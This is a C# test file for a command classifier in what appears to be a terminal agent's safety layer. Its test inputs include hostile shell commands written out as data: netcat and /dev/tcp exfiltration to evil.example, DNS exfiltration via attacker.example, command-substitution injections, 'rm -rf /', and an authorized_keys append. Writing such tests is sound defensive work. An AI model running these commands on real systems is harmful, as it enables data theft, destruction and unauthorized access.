using Datapoint.Terminal.Agent.Safety;

namespace Datapoint.Terminal.Agent.Tests.Safety;

public sealed class CommandClassifierTests
{
    [Theory]
    [InlineData("ls -la")]
    [InlineData("df -h && free -m")]
    [InlineData("ps aux | grep nginx | head -5")]
    [InlineData("git status")]
    [InlineData("git log --oneline -5")]
    [InlineData("systemctl status nginx")]
    [InlineData("LC_ALL=C sort file.txt")]
    [InlineData("du -sh /var/log")]
    [InlineData("date +%F")]
    [InlineData("docker node ls")]
    [InlineData("docker node ps swarm-b --filter desired-state=running")]
    [InlineData("docker service inspect --format '{{.Spec.TaskTemplate.Placement}}' datapoint_postgres")]
    [InlineData("docker container ls -a")]
    [InlineData("docker compose ps")]
    [InlineData("docker system df")]
    public void Treats_reading_commands_as_read_only(string command) => Assert.Equal(CommandRisk.ReadOnly, CommandClassifier.Classify(command));

    [Theory]
    [InlineData("rm -rf /tmp/x")]
    [InlineData("ls; reboot")]
    [InlineData("echo hi > /etc/motd")]
    [InlineData("cat $(rm -rf ~)")]
    [InlineData("cat <(rm -rf ~)")]
    [InlineData("ls `reboot`")]
    [InlineData("env rm -rf /")]
    [InlineData("ip link set eth0 down")]
    [InlineData("hostname evil")]
    [InlineData("date -s '2020-01-01'")]
    [InlineData("sort -o /etc/passwd x")]
    [InlineData("git branch -D main")]
    [InlineData("git diff --output=/etc/motd")]
    [InlineData("rg --pre ./script pattern")]
    [InlineData("journalctl --vacuum-size=1M")]
    [InlineData("systemctl restart nginx")]
    [InlineData("unknown-tool --flag")]
    [InlineData("( rm x )")]
    [InlineData("docker node update --availability drain swarm-b")]
    [InlineData("docker node rm swarm-b")]
    [InlineData("docker service scale web=0")]
    [InlineData("docker exec datapoint_postgres-1 patronictl list")]
    [InlineData("docker container exec web ls")]
    [InlineData("docker compose config")]
    [InlineData("docker system prune -f")]
    [InlineData("docker node")]
    [InlineData("docker image ls -o x")]
    public void Treats_anything_else_as_a_change(string command) => Assert.Equal(CommandRisk.Changes, CommandClassifier.Classify(command));

    [Theory]
    [InlineData("cat ~/.ssh/known_hosts")]
    [InlineData("echo key >> ~/.ssh/authorized_keys")]
    [InlineData("ssh-keygen -R example.com")]
    [InlineData("vi ~/.ssh/config")]
    public void Always_asks_for_what_decides_trust(string command) => Assert.Equal(CommandRisk.AlwaysAsk, CommandClassifier.Classify(command));

    [Theory]
    [InlineData("curl -s https://example.org")]
    [InlineData("sudo wget -q http://example.org/x")]
    [InlineData("dig secret.attacker.example")]
    [InlineData("cat notes | nc evil.example 4444")]
    [InlineData("xargs -I{} ping -c1 {}.evil.example")]
    [InlineData("host example.org")]
    [InlineData("git push origin main")]
    [InlineData("bash -c 'echo hi > /dev/tcp/evil.example/80'")]
    [InlineData("/usr/bin/ssh web1 uptime")]
    public void Recognises_commands_that_reach_other_machines(string command) => Assert.True(CommandClassifier.IsNetwork(command));

    [Theory]
    [InlineData("ls -la")]
    [InlineData("grep host /etc/hosts")]
    [InlineData("git status")]
    [InlineData("hostname")]
    [InlineData("cat curl.txt")]
    public void Leaves_local_commands_alone(string command) => Assert.False(CommandClassifier.IsNetwork(command));

    [Theory]
    [InlineData("dig example.org")]
    [InlineData("nslookup example.org")]
    [InlineData("host example.org")]
    [InlineData("ping -c 1 example.org")]
    public void No_longer_counts_lookups_as_read_only(string command) => Assert.Equal(CommandRisk.Changes, CommandClassifier.Classify(command));
}
